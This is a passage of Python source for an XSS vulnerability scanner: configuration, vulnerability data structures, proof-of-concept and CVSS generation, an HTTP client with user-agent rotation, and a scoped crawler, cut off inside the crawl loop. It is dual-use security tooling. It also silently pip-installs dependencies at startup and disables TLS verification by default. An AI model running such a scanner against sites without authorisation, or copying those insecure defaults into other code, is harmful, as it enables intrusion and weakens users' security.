#!/usr/bin/env python3
"""
PROFESSIONAL XSS SCANNER - Enterprise Edition
Version: 4.0
Features:
- Complete modern architecture with async support
- Advanced crawling with tldextract for domain handling
- Rich payload library with context-aware generation
- Multi-verification methods for reduced false positives
- Comprehensive HTML/JSON reporting with templates
- Built-in OOB (Out-of-Band) detection server
- Advanced JavaScript analysis with AST parsing
- Smart rate limiting and connection pooling
- Support for modern frameworks (React, Vue, Angular)
- CVSS 3.1 scoring and risk assessment
"""

import os
import re
import sys
import json
import time
import random
import hashlib
import logging
import asyncio
import argparse
import threading
import subprocess
import urllib.parse
import urllib.parse as urlparse
from typing import *
from dataclasses import dataclass, field
from datetime import datetime, timedelta
from collections import defaultdict, deque, OrderedDict
from concurrent.futures import ThreadPoolExecutor, as_completed
import html
import base64
import uuid
import socket
import ssl
import mimetypes
import ipaddress
import statistics
from pathlib import Path
import inspect
import itertools
import functools

# ============================================================================
# THIRD-PARTY IMPORTS WITH PROPER HANDLING
# ============================================================================

try:
    import requests
    from requests.adapters import HTTPAdapter
    from requests.packages.urllib3.util.retry import Retry
    from requests.exceptions import RequestException
    REQUESTS_AVAILABLE = True
except ImportError:
    REQUESTS_AVAILABLE = False

try:
    from bs4 import BeautifulSoup
    BS4_AVAILABLE = True
except ImportError:
    BS4_AVAILABLE = False

try:
    import tldextract
    TLDEXTRACT_AVAILABLE = True
except ImportError:
    TLDEXTRACT_AVAILABLE = False

try:
    from selenium import webdriver
    from selenium.webdriver.common.by import By
    from selenium.webdriver.support.ui import WebDriverWait
    from selenium.webdriver.support import expected_conditions as EC
    from selenium.webdriver.chrome.options import Options as ChromeOptions
    from selenium.webdriver.firefox.options import Options as FirefoxOptions
    from selenium.common.exceptions import WebDriverException,TimeoutException
    SELENIUM_AVAILABLE = True
except ImportError:
    SELENIUM_AVAILABLE = False

try:
    import dukpy
    DUKPY_AVAILABLE = True
except ImportError:
    DUKPY_AVAILABLE = False

try:
    from py_mini_racer import MiniRacer
    MINIRACER_AVAILABLE = True
except ImportError:
    MINIRACER_AVAILABLE = False

try:
    import aiohttp
    import aiofiles
    AIOHTTP_AVAILABLE = True
except ImportError:
    AIOHTTP_AVAILABLE = False

try:
    import jinja2
    JINJA2_AVAILABLE = True
except ImportError:
    JINJA2_AVAILABLE = False

try:
    import colorama
    from colorama import Fore, Back, Style
    COLORAMA_AVAILABLE = True
except ImportError:
    COLORAMA_AVAILABLE = False

try:
    import yaml
    YAML_AVAILABLE = True
except ImportError:
    YAML_AVAILABLE = False

try:
    import whois
    WHOIS_AVAILABLE = True
except ImportError:
    WHOIS_AVAILABLE = False

try:
    import dns.resolver
    DNS_AVAILABLE = True
except ImportError:
    DNS_AVAILABLE = False

# Auto-install missing dependencies
def install_missing_dependencies():
    """Install missing dependencies automatically"""
    dependencies = []

    if not REQUESTS_AVAILABLE:
        dependencies.append("requests")

    if not BS4_AVAILABLE:
        dependencies.append("beautifulsoup4")

    if not TLDEXTRACT_AVAILABLE:
        dependencies.append("tldextract")

    if not SELENIUM_AVAILABLE:
        dependencies.append("selenium")

    if not DUKPY_AVAILABLE:
        dependencies.append("dukpy")

    if not MINIRACER_AVAILABLE:
        dependencies.append("py_mini_racer")

    if not AIOHTTP_AVAILABLE:
        dependencies.extend(["aiohttp", "aiofiles"])

    if not JINJA2_AVAILABLE:
        dependencies.append("jinja2")

    if not COLORAMA_AVAILABLE:
        dependencies.append("colorama")

    if not YAML_AVAILABLE:
        dependencies.append("pyyaml")

    if not WHOIS_AVAILABLE:
        dependencies.append("python-whois")

    if not DNS_AVAILABLE:
        dependencies.append("dnspython")

    if dependencies:
        print(f"[*] Installing missing dependencies: {', '.join(dependencies)}")
        try:
            subprocess.check_call([sys.executable, "-m", "pip", "install"] + dependencies + ["--quiet"])
            print("[✓] Dependencies installed successfully!")
            print("[*] Please restart the scanner.")
            sys.exit(0)
        except subprocess.CalledProcessError as e:
            print(f"[!] Failed to install dependencies: {e}")
            sys.exit(1)

# Check and install dependencies
install_missing_dependencies()

# Re-import after installation
import tldextract
import colorama
from colorama import Fore, Back, Style
colorama.init()

# ============================================================================
# ADVANCED CONFIGURATION WITH VALIDATION
# ============================================================================

@dataclass
class ScannerConfig:
    """Advanced configuration with validation"""

    # Target
    target_url: str

    # Identity
    scan_id: str = field(default_factory=lambda: f"xss_{datetime.now().strftime('%Y%m%d_%H%M%S')}_{uuid.uuid4().hex[:8]}")
    scanner_name: str = "ProfessionalXSSScanner"
    version: str = "4.0"

    # Performance
    max_threads: int = 25
    max_depth: int = 5
    max_pages: int = 200
    max_links_per_page: int = 100
    request_timeout: int = 15
    request_delay: float = 0.1
    max_retries: int = 3
    connection_pool_size: int = 50

    # Scanning Modes
    scan_reflected: bool = True
    scan_stored: bool = True
    scan_dom: bool = True
    scan_blind: bool = True
    scan_json: bool = True
    scan_websocket: bool = False
    scan_graphql: bool = False
    scan_ssti: bool = False  # Server-Side Template Injection

    # Crawling Options
    follow_redirects: bool = True
    max_redirects: int = 5
    respect_robots: bool = True
    crawl_same_domain: bool = True
    crawl_subdomains: bool = True
    crawl_external: bool = False
    parse_sitemap: bool = True
    use_wayback: bool = False  # Use Wayback Machine

    # Browser Automation
    use_browser: bool = True
    browser_type: str = "chrome"  # chrome, firefox, remote
    headless: bool = True
    browser_timeout: int = 30
    browser_max_instances: int = 3

    # Payload Configuration
    payload_level: str = "advanced"  # basic, intermediate, advanced, expert
    max_payloads_per_param: int = 50
    use_evasion: bool = True
    use_polyglot: bool = True
    use_context_aware: bool = True
    payload_intelligence: bool = True
    custom_payload_file: str = None

    # Advanced Detection
    detect_waf: bool = True
    detect_csp: bool = True
    detect_hsts: bool = True
    detect_frameworks: bool = True
    fingerprint_js: bool = True
    analyze_js_ast: bool = True
    detect_sinks: bool = True
    detect_sources: bool = True
    detect_trusted_types: bool = True

    # Verification
    verify_reflected: bool = True
    verify_stored: bool = True
    verify_dom: bool = True
    verification_method: str = "multi"  # single, multi, browser
    max_verification_attempts: int = 3

    # OOB Detection
    use_oob: bool = True
    oob_server: str = "interact.sh"
    oob_domain: str = None
    oob_protocol: str = "http"  # http, https, dns

    # Security Controls
    verify_ssl: bool = False
    user_agent_rotation: bool = True
    proxy: str = None
    rate_limit: int = 0  # requests per second
    max_request_size: int = 10485760  # 10MB

    # Output
    output_dir: str = "reports"
    output_format: str = "both"  # json, html, both, markdown
    verbose: bool = False
    debug: bool = False
    quiet: bool = False
    color_output: bool = True

    # Advanced Features
    risk_assessment: bool = True
    cvss_scoring: bool = True
    generate_poc: bool = True
    generate_exploit: bool = False
    generate_curl: bool = True
    generate_python: bool = True
    chain_detection: bool = True
    persistent_testing: bool = False

    # Database
    use_database: bool = False
    db_path: str = "scans.db"

    # Notifications
    notify_on_critical: bool = False
    webhook_url: str = None

    def __post_init__(self):
        """Post-initialization validation and setup"""
        # Validate URL
        if not self.target_url.startswith(('http://', 'https://')):
            raise ValueError("Target URL must start with http:// or https://")

        # Parse URL
        parsed = urlparse.urlparse(self.target_url)
        if not parsed.netloc:
            raise ValueError("Invalid URL format")

        # Extract domain info
        self.extracted = tldextract.extract(self.target_url)
        self.domain = self.extracted.fqdn #hostname maybe with subdomain if target url is subdomain example a.b.com => a.b.com
        self.subdomain = self.extracted.subdomain #a
        #self.full_domain = f"{self.subdomain}.{self.domain}" if self.subdomain else self.domain
        self.full_domain = self.domain

        # Set OOB domain if not provided
        if self.use_oob and not self.oob_domain:
            self.oob_domain = f"{self.scan_id}.{self.oob_server}"

        # Create output directory
        os.makedirs(self.output_dir, exist_ok=True)

        # Setup headers
        self._setup_headers()

        # Setup logging
        self._setup_logging()

    def _setup_headers(self):
        """Setup HTTP headers with rotation"""
        self.user_agents = [
            # Chrome
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.159 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            # Firefox
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0",
            # Safari
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
            # Edge
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
        ]

        self.base_headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-User': '?1',
        }

        self.api_headers = {
            'Accept': 'application/json, text/plain, */*',
            'Content-Type': 'application/json',
            'X-Requested-With': 'XMLHttpRequest',
        }

    def _setup_logging(self):
        """Setup advanced logging"""
        log_dir = os.path.join(self.output_dir, "logs")
        os.makedirs(log_dir, exist_ok=True)

        log_file = os.path.join(log_dir, f"{self.scan_id}.log")

        log_level = logging.DEBUG if self.debug else logging.INFO if self.verbose else logging.WARNING

        # Clear existing handlers
        logging.getLogger().handlers.clear()

        # Configure logging
        logging.basicConfig(
            level=log_level,
            format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
            handlers=[
                logging.FileHandler(log_file, encoding='utf-8'),
                logging.StreamHandler() if not self.quiet else logging.NullHandler()
            ]
        )

        # Suppress noisy loggers
        noisy_loggers = ['urllib3', 'selenium', 'charset_normalizer', 'asyncio']
        for logger_name in noisy_loggers:
            logging.getLogger(logger_name).setLevel(logging.WARNING)

        self.logger = logging.getLogger(self.scanner_name)

    def validate(self):
        """Validate configuration"""
        issues = []

        # Thread validation
        if self.max_threads < 1 or self.max_threads > 100:
            issues.append("max_threads must be between 1 and 100")

        # Depth validation
        if self.max_depth < 0 or self.max_depth > 10:
            issues.append("max_depth must be between 0 and 10")

        # Timeout validation
        if self.request_timeout < 1 or self.request_timeout > 300:
            issues.append("request_timeout must be between 1 and 300 seconds")

        # Browser validation
        if self.use_browser and not SELENIUM_AVAILABLE:
            issues.append("Selenium is required for browser automation")

        if issues:
            raise ValueError(f"Configuration validation failed: {'; '.join(issues)}")

        return True

# ============================================================================
# ADVANCED DATA STRUCTURES
# ============================================================================

@dataclass
class Vulnerability:
    """Comprehensive vulnerability representation"""

    # Core Information
    id: str
    type: str  # reflected, stored, dom, blind, json, ssti, etc.
    url: str
    method: str
    parameter: str
    payload: str

    # Scoring
    confidence: float
    severity: str  # critical, high, medium, low, info


    # Evidence
    evidence: str
    context: Dict[str, Any] = field(default_factory=dict)
    location: str = ""  # Where in response

    # Verification
    verified: bool = False
    verification_method: str = ""
    verification_timestamp: str = ""

    # Technical Details
    http_request: Dict = field(default_factory=dict)
    http_response: Dict = field(default_factory=dict)
    browser_screenshot: str = ""
    js_execution_log: List[str] = field(default_factory=list)

    # Impact
    impact_description: str = ""
    affected_users: str = ""  # all, authenticated, admin, etc.
    persistence: str = ""  # persistent, one-time

    # Remediation
    remediation: str = ""
    remediation_priority: str = ""
    references: List[str] = field(default_factory=list)

    # PoC
    poc_html: str = ""
    poc_curl: str = ""
    poc_python: str = ""
    poc_javascript: str = ""

    # Metadata
    timestamp: str = field(default_factory=lambda: datetime.now().isoformat())
    scanner_id: str = ""
    tags: List[str] = field(default_factory=list)

    risk_score: float = 0.0
    cvss_vector: str = ""
    cvss_score: float = 0.0
    exploitability: str = ""  # high, medium, low

    def to_dict(self) -> Dict:
        """Convert to dictionary for serialization"""
        data = {}
        for field_name, field_value in self.__dict__.items():
            if field_name.startswith('_'):
                continue
            if isinstance(field_value, (list, dict, str, int, float, bool)) or field_value is None:
                data[field_name] = field_value
            else:
                data[field_name] = str(field_value)
        return data

    def generate_pocs(self):
        """Generate proof-of-concept code"""
        # HTML PoC
        self.poc_html = f"""<!DOCTYPE html>
<html>
<head>
    <title>XSS Proof of Concept - {self.id}</title>
</head>
<body>
    <h1>XSS Proof of Concept</h1>
    <p><strong>Type:</strong> {self.type}</p>
    <p><strong>URL:</strong> {self.url}</p>
    <p><strong>Payload:</strong> <code>{html.escape(self.payload)}</code></p>

    <h2>Exploit</h2>
    <p>Navigate to: <a href="{self.url}" target="_blank">{self.url}</a></p>

    <script>
        // JavaScript verification
        console.log("XSS PoC for vulnerability: {self.id}");
    </script>
</body>
</html>"""

        # cURL PoC
        if self.method.upper() == 'GET':
            self.poc_curl = f'curl -i "{self.url}"'
        else:
            # Simplified - would need to include POST data
            self.poc_curl = f'curl -X {self.method} "{self.url}"'

        # Python PoC
        self.poc_python = f"""import requests

# XSS Exploit for vulnerability: {self.id}
url = "{self.url}"
method = "{self.method}"

response = requests.request(method, url, verify=False)
print(f"Status Code: {{response.status_code}}")
print(f"Content Length: {{len(response.content)}}")

# Check if payload is reflected
if "{self.payload[:50]}" in response.text:
    print("Payload reflected in response!")
else:
    print("Payload not reflected.")"""

    def calculate_cvss(self):
        """Calculate CVSS 3.1 score"""
        # Simplified CVSS calculator
        # Base metrics
        attack_vector = 0.85  # Network
        attack_complexity = 0.77  # Low
        privileges_required = 0.85  # None
        user_interaction = 0.85  # Required for reflected

        if self.type == 'stored':
            user_interaction = 0.62  # None for stored

        scope = 0.0  # Unchanged

        confidentiality = 0.22  # Low
        integrity = 0.22  # Low
        availability = 0.0  # None

        # Calculate
        exploitability = 8.22 * attack_vector * attack_complexity * privileges_required * user_interaction
        impact = 1 - ((1 - confidentiality) * (1 - integrity) * (1 - availability))

        if scope > 0:
            impact = 7.52 * (impact - 0.029) - 3.25 * (impact - 0.02) ** 15
        else:
            impact = 6.42 * impact

        if impact <= 0:
            self.cvss_score = 0.0
        else:
            if scope > 0:
                self.cvss_score = min(1.08 * (impact + exploitability), 10.0)
            else:
                self.cvss_score = min(impact + exploitability, 10.0)

        # Generate vector
        self.cvss_vector = f"CVSS:3.1/AV:N/AC:L/PR:N/UI:{'R' if user_interaction > 0.6 else 'N'}/S:U/C:L/I:L/A:N"

        return self.cvss_score

@dataclass
class PageInfo:
    """Comprehensive page information"""

    url: str
    status_code: int
    content_type: str
    content_length: int
    content_hash: str

    # Headers
    headers: Dict[str, str]
    cookies: Dict[str, str]

    # Content
    html: str = ""
    title: str = ""
    text_content: str = ""

    # Analysis
    forms: List[Dict] = field(default_factory=list)
    inputs: List[Dict] = field(default_factory=list)
    links: List[str] = field(default_factory=list)
    scripts: List[str] = field(default_factory=list)
    iframes: List[str] = field(default_factory=list)
    parameters: List[Dict] = field(default_factory=list)

    # JavaScript Analysis
    js_sources: List[str] = field(default_factory=list)
    js_sinks: List[Dict] = field(default_factory=list)
    js_vulnerabilities: List[Dict] = field(default_factory=list)

    # Security Headers
    security_headers: Dict[str, str] = field(default_factory=dict)

    # Technologies
    technologies: List[str] = field(default_factory=list)
    frameworks: List[str] = field(default_factory=list)

    # Metadata
    load_time: float = 0.0
    screenshot_path: str = ""
    dom_size: int = 0

    def to_dict(self) -> Dict:
        """Convert to dictionary"""
        return {
            'url': self.url,
            'status_code': self.status_code,
            'content_type': self.content_type,
            'content_length': self.content_length,
            'title': self.title,
            'forms_count': len(self.forms),
            'inputs_count': len(self.inputs),
            'links_count': len(self.links),
            'scripts_count': len(self.scripts),
            'technologies': self.technologies,
        }

@dataclass
class ScanResult:
    """Complete scan results"""

    scan_id: str
    target_url: str
    start_time: datetime
    end_time: datetime = None
    duration: float = 0.0

    # Statistics
    pages_scanned: int = 0
    requests_made: int = 0
    vulnerabilities_found: int = 0

    # Data
    vulnerabilities: List[Vulnerability] = field(default_factory=list)
    pages: List[PageInfo] = field(default_factory=list)

    # Analysis
    waf_detected: bool = False
    waf_type: str = ""
    csp_detected: bool = False
    hsts_enabled: bool = False

    # Technologies
    technologies: Dict[str, List[str]] = field(default_factory=dict)

    # Risk Assessment
    risk_level: str = "low"
    risk_score: float = 0.0

    # Configuration
    config: Dict = field(default_factory=dict)

    def calculate_statistics(self):
        """Calculate comprehensive statistics"""
        stats = {
            'total_vulnerabilities': len(self.vulnerabilities),
            'by_type': defaultdict(int),
            'by_severity': defaultdict(int),
            'by_confidence': defaultdict(int),
            'verified_count': 0,
            'pages_by_status': defaultdict(int),
        }

        for vuln in self.vulnerabilities:
            stats['by_type'][vuln.type] += 1
            stats['by_severity'][vuln.severity] += 1

            if vuln.confidence >= 0.8:
                stats['by_confidence']['high'] += 1
            elif vuln.confidence >= 0.5:
                stats['by_confidence']['medium'] += 1
            else:
                stats['by_confidence']['low'] += 1

            if vuln.verified:
                stats['verified_count'] += 1

        for page in self.pages:
            stats['pages_by_status'][page.status_code] += 1

        return stats

    def generate_summary(self):
        """Generate executive summary"""
        stats = self.calculate_statistics()

        summary = {
            'scan_id': self.scan_id,
            'target': self.target_url,
            'duration': f"{self.duration:.2f} seconds",
            'pages_scanned': self.pages_scanned,
            'vulnerabilities_found': stats['total_vulnerabilities'],
            'critical_vulnerabilities': stats['by_severity'].get('critical', 0),
            'high_vulnerabilities': stats['by_severity'].get('high', 0),
            'risk_level': self.risk_level,
            'risk_score': f"{self.risk_score:.1f}/100",
            'waf_detected': self.waf_detected,
            'waf_type': self.waf_type,
            'csp_detected': self.csp_detected,
        }

        return summary

# ============================================================================
# ADVANCED HTTP CLIENT WITH INTELLIGENCE
# ============================================================================

class AdvancedHTTPClient:
    """Professional HTTP client with intelligence"""

    def __init__(self, config: ScannerConfig):
        self.config = config
        self.logger = logging.getLogger(f"{config.scanner_name}.HTTPClient")

        # Sessions
        self.main_session = None
        self.api_session = None
        self.stored_session = None  # Separate session for stored XSS

        # Cache
        self.cache = {}
        self.cache_ttl = 300  # 5 minutes

        # Statistics
        self.stats = {
            'requests': 0,
            'errors': 0,
            'cache_hits': 0,
            'redirects': 0,
        }

        # Rate limiting
        self.rate_limiter = RateLimiter(config.rate_limit or config.max_threads * 2)

        # Initialize
        self._init_sessions()

    def _init_sessions(self):
        """Initialize HTTP sessions"""
        # Main session
        self.main_session = self._create_session("main")

        # API session (for JSON endpoints)
        self.api_session = self._create_session("api")
        self.api_session.headers.update(self.config.api_headers)

        # Stored XSS session (isolated)
        self.stored_session = self._create_session("stored")

    def _create_session(self, name: str) -> requests.Session:
        """Create a configured HTTP session"""
        session = requests.Session()

        # Configure retries
        retry_strategy = Retry(
            total=self.config.max_retries,
            backoff_factor=0.3,
            status_forcelist=[429, 500, 502, 503, 504],
            allowed_methods=["GET", "POST", "PUT", "DELETE", "HEAD", "OPTIONS"]
        )

        adapter = HTTPAdapter(
            max_retries=retry_strategy,
            pool_connections=self.config.connection_pool_size,
            pool_maxsize=self.config.connection_pool_size * 2,
            pool_block=False
        )

        session.mount("http://", adapter)
        session.mount("https://", adapter)

        # Configure SSL
        session.verify = self.config.verify_ssl
        if not self.config.verify_ssl:
            import urllib3
            urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

        # Set headers
        if self.config.user_agent_rotation:
            session.headers.update({'User-Agent': random.choice(self.config.user_agents)})
        else:
            session.headers.update({'User-Agent': self.config.user_agents[0]})

        session.headers.update(self.config.base_headers)

        # Configure proxy
        if self.config.proxy:
            session.proxies = {
                'http': self.config.proxy,
                'https': self.config.proxy
            }

        return session

    def request(self, method: str, url: str, session_type: str = "main", **kwargs) -> Optional[requests.Response]:
        """Make HTTP request with intelligence"""
        # Rate limiting
        self.rate_limiter.wait()

        # Get session
        session = self._get_session(session_type)

        # Prepare request
        kwargs.setdefault('timeout', self.config.request_timeout)
        kwargs.setdefault('allow_redirects', self.config.follow_redirects)
        #------------------------
        #kwargs.setdefault('max_redirects', self.config.max_redirects)
        #---------------------------
        kwargs.setdefault('verify', self.config.verify_ssl)

        # Check cache
        cache_key = self._generate_cache_key(method, url, kwargs)
        if cache_key in self.cache:
            cached_time, response = self.cache[cache_key]
            if time.time() - cached_time < self.cache_ttl:
                self.stats['cache_hits'] += 1
                return response

        try:
            # Rotate User-Agent if enabled
            if self.config.user_agent_rotation and session_type == "main":
                session.headers['User-Agent'] = random.choice(self.config.user_agents)

            # Make request
            start_time = time.time()
            response = session.request(method, url, **kwargs)
            request_time = time.time() - start_time

            # Update statistics
            self.stats['requests'] += 1

            # Log request
            if self.config.debug:
                self.logger.debug(f"{method} {url} -> {response.status_code} ({request_time:.2f}s)")

            # Handle redirects
            if response.history:
                self.stats['redirects'] += len(response.history)

            # Cache successful responses
            if response.status_code < 400 and method.upper() == 'GET':
                self.cache[cache_key] = (time.time(), response)

            # Apply delay if configured
            if self.config.request_delay > 0:
                time.sleep(self.config.request_delay)

            return response

        except requests.exceptions.Timeout:
            self.logger.warning(f"Timeout for {url}")
            self.stats['errors'] += 1
            return None

        except requests.exceptions.RequestException as e:
            self.logger.debug(f"Request failed for {url}: {e}")
            self.stats['errors'] += 1
            return None

    def _get_session(self, session_type: str) -> requests.Session:
        """Get session by type"""
        sessions = {
            "main": self.main_session,
            "api": self.api_session,
            "stored": self.stored_session
        }
        return sessions.get(session_type, self.main_session)

    def _generate_cache_key(self, method: str, url: str, kwargs: Dict) -> str:
        """Generate cache key for request"""
        key_parts = [method.upper(), url]

        # Include relevant kwargs
        for key in ['params', 'data', 'json']:
            if key in kwargs and kwargs[key]:
                key_parts.append(str(kwargs[key]))

        # Include headers if they affect response
        if 'headers' in kwargs:
            important_headers = ['User-Agent', 'Accept', 'Accept-Language']
            for header in important_headers:
                if header in kwargs['headers']:
                    key_parts.append(f"{header}:{kwargs['headers'][header]}")

        return hashlib.md5('|'.join(key_parts).encode()).hexdigest()

    def get(self, url: str, **kwargs) -> Optional[requests.Response]:
        """HTTP GET request"""
        return self.request('GET', url, **kwargs)

    def post(self, url: str, data=None, json=None, **kwargs) -> Optional[requests.Response]:
        """HTTP POST request"""
        kwargs['data'] = data
        kwargs['json'] = json
        return self.request('POST', url, **kwargs)

    def put(self, url: str, data=None, **kwargs) -> Optional[requests.Response]:
        """HTTP PUT request"""
        kwargs['data'] = data
        return self.request('PUT', url, **kwargs)

    def delete(self, url: str, **kwargs) -> Optional[requests.Response]:
        """HTTP DELETE request"""
        return self.request('DELETE', url, **kwargs)

    def head(self, url: str, **kwargs) -> Optional[requests.Response]:
        """HTTP HEAD request"""
        return self.request('HEAD', url, **kwargs)

    def options(self, url: str, **kwargs) -> Optional[requests.Response]:
        """HTTP OPTIONS request"""
        return self.request('OPTIONS', url, **kwargs)

class RateLimiter:
    """Intelligent rate limiter"""

    def __init__(self, max_rate: float):
        self.max_rate = max_rate
        self.min_interval = 1.0 / max_rate if max_rate > 0 else 0
        self.last_request_time = 0
        self.lock = threading.Lock()

    def wait(self):
        """Wait if necessary to respect rate limit"""
        if self.max_rate <= 0:
            return

        with self.lock:
            current_time = time.time()
            elapsed = current_time - self.last_request_time

            if elapsed < self.min_interval:
                sleep_time = self.min_interval - elapsed
                time.sleep(sleep_time)

            self.last_request_time = time.time()

# ============================================================================
# ADVANCED CRAWLER WITH TLDeXTRACT
# ============================================================================

class ProfessionalCrawler:
    """Advanced web crawler with intelligent domain handling"""

    def __init__(self, http_client: AdvancedHTTPClient, config: ScannerConfig):
        self.client = http_client
        self.config = config
        self.logger = logging.getLogger(f"{config.scanner_name}.Crawler")

        # URL Management
        self.visited = OrderedDict()
        self.to_crawl = deque()
        self.discovered = []

        # Domain Management
        self.base_domain = self._extract_domain(config.target_url)
        self.allowed_domains = self._get_allowed_domains()

        # Statistics
        self.stats = {
            'urls_discovered': 0,
            'urls_crawled': 0,
            'urls_filtered': 0,
            'skipped': 0,
            'errors': 0,
        }

        # Robots.txt
        self.robots_rules = None
        if config.respect_robots:
            self._load_robots_txt()

        # Sitemap
        self.sitemap_urls = []
        if config.parse_sitemap:
            self._parse_sitemap()

        #=============
        self.visited_lock = threading.Lock()
        #==================

    def _extract_domain(self, url: str) -> str:
        """
        Extract registrable domain (handles public suffixes correctly)
        """
        try:
            parsed = urlparse.urlparse(url)
            hostname = parsed.hostname

            if not hostname:
                return ""

            # Localhost / IP
            if hostname in ("localhost", "127.0.0.1", "0.0.0.0") or self._is_ip_address(hostname):
                return hostname

            extracted = tldextract.extract(hostname)

            if not extracted.domain or not extracted.suffix:
                return hostname

            # ✅ IMPORTANT: registrable domain only
            return f"{extracted.domain}.{extracted.suffix}".lower()

        except Exception as e:
            self.logger.error(f"Domain extraction failed for {url}: {e}")
            return ""

    def _get_allowed_domains(self) -> Set[str]:
        """Get list of allowed domains for crawling"""
        '''domains = {self.base_domain}

        # Add subdomains if enabled
        if self.config.crawl_subdomains:
            # Extract base domain without subdomain
            extracted = tldextract.extract(self.config.target_url)
            base = extracted.fqdn

            # We'll allow any subdomain of the base domain
            domains.add(f"*.{base}")

        # Add external domains if enabled
        if self.config.crawl_external:
            # Parse for known CDNs, APIs, etc.
            domains.add("*")

        return domains'''
        domains = set()

        target = self.config.target_url
        parsed = urlparse.urlparse(target)
        hostname = parsed.hostname

        if not hostname:
            return domains

        # --------------------------------------------------
        # Case 1: localhost or IP address
        # --------------------------------------------------
        if hostname in ("localhost", "127.0.0.1") or self._is_ip_address(hostname):
            domains.add(hostname)

            # Subdomains do NOT apply to IPs / localhost
            return domains

        # --------------------------------------------------
        # Case 2: Normal domain (example.com, example.co.uk)
        # --------------------------------------------------
        extracted = tldextract.extract(hostname)

        if not extracted.domain or not extracted.suffix:
            # Safety fallback
            domains.add(hostname)
            return domains

        base_domain = f"{extracted.domain}.{extracted.suffix}"
        domains.add(base_domain)

        # Allow subdomains
        if self.config.crawl_subdomains:
            domains.add(f"*.{base_domain}")

        # Allow everything (dangerous, explicit opt-in)
        if self.config.crawl_external:
            domains.add("*")

        return domains

    def _is_ip_address(self, host: str) -> bool:
        try:
            import ipaddress
            ipaddress.ip_address(host)
            return True
        except ValueError:
            return False

    def _load_robots_txt(self):
        """Load and parse robots.txt"""
        robots_url = urlparse.urljoin(self.config.target_url, "/robots.txt")

        try:
            response = self.client.get(robots_url)
            if response and response.status_code == 200:
                self.robots_rules = self._parse_robots_txt(response.text)
                self.logger.info(f"Loaded robots.txt from {robots_url}")
        except Exception as e:
            self.logger.debug(f"Failed to load robots.txt: {e}")

    def _parse_robots_txt(self, content: str) -> Dict:
        """Parse robots.txt content"""
        rules = {'allow': [], 'disallow': []}

        user_agent = None
        for line in content.split('\n'):
            line = line.strip()
            if not line or line.startswith('#'):
                continue

            if line.lower().startswith('user-agent:'):
                user_agent = line.split(':', 1)[1].strip()
            elif line.lower().startswith('allow:') and user_agent == '*':
                path = line.split(':', 1)[1].strip()
                rules['allow'].append(path)
            elif line.lower().startswith('disallow:') and user_agent == '*':
                path = line.split(':', 1)[1].strip()
                rules['disallow'].append(path)

        return rules

    def _parse_sitemap(self):
        """Parse sitemap.xml if available"""
        sitemap_urls = [
            urlparse.urljoin(self.config.target_url, "/sitemap.xml"),
            urlparse.urljoin(self.config.target_url, "/sitemap_index.xml"),
            urlparse.urljoin(self.config.target_url, "/sitemap"),
        ]

        for sitemap_url in sitemap_urls:
            try:
                response = self.client.get(sitemap_url)
                if response and response.status_code == 200:
                    self.sitemap_urls.extend(self._extract_urls_from_sitemap(response.text))
                    self.logger.info(f"Found sitemap at {sitemap_url} with {len(self.sitemap_urls)} URLs")
                    break
            except Exception as e:
                self.logger.debug(f"Failed to parse sitemap {sitemap_url}: {e}")

    def _extract_urls_from_sitemap(self, content: str) -> List[str]:
        """Extract URLs from sitemap XML"""
        urls = []

        # Simple XML parsing for URLs
        url_patterns = [
            r'<loc>\s*(.*?)\s*</loc>',
            r'<url>\s*<loc>\s*(.*?)\s*</loc>',
        ]

        for pattern in url_patterns:
            matches = re.finditer(pattern, content, re.IGNORECASE | re.DOTALL)
            for match in matches:
                url = match.group(1).strip()
                if url and self._is_valid_url(url):
                    urls.append(url)

        return list(set(urls))

    def crawl(self, start_url: str = None) -> List[PageInfo]:
        """Crawl website starting from URL"""
        start_url = start_url or self.config.target_url

        if not self.config.quiet:
            print(f"{Fore.CYAN}[*] Starting professional crawl from: {start_url}{Style.RESET_ALL}")

        # Initialize queue
        self.to_crawl.append((start_url, 0))

        # Add sitemap URLs
        for url in self.sitemap_urls:
            self.stats['urls_discovered'] += 1
            if self._should_crawl(url):
                self.to_crawl.append((url, 0))
            else:
                self.stats['urls_filtered'] += 1

        # Start crawling with thread pool
        with ThreadPoolExecutor(max_workers=self.config.max_threads) as executor:
            futures = []

            while (self.to_crawl and
                   len(self.visited) < self.config.max_pages and
                   len(self.discovered) < self.config.max_pages):

                # Get batch of URLs
                batch = []
                while self.to_crawl and len(batch) < self.config.max_threads:
                    try:
                        url, depth = self.to_crawl.popleft()
                        if url not in self.visited:
                            batch.append((url, depth))
                    except IndexError:
                        break

                if not batch:
                    break

                # Submit batch for crawling
                for url, depth in batch:
                    future = executor.submit(self._crawl_page, url, depth)
                    future.depth = depth
                    futures.append(future)

                # Process completed futures
                completed = []
                for future in as_completed(futures):
                    try:
                        page = future.result(timeout=30)
                        depth = getattr(future, "depth", 0)
                        if page:
                            self.discovered.append(page)

                            # Extract new links if depth allows
                            if depth < self.config.max_depth:
                                for link in page.links[:self.config.max_links_per_page]:
